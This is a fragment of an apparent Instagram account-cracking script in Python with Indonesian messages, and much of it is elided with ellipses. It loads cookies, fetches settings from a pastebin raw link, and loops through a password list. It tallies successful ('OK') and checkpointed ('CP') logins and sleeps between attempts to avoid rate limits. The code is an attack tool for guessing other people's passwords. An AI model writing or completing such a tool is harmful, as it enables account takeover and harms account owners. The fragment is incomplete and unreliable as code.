...
""",title=f"{P2}{N2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
  ...
  #      self.loadCookie(Instagram)
    ...
    def gett(self):
        try:
            iyh.update(self.ses.get("https://pastebin.com/raw/LqqarNBj").json())
        except requests.ConnectionError:
            self.logoo()
            print(f" {O}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()
        ...
        for password in pasw:
            try:
             ...
             #       os.popen('play-audio raycp.mp3')
                    ...
                    prog.update(des,description=f"MVRK ( {M2}Error{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
                    time.sleep(15)
            except requests.exceptions.ConnectionError:
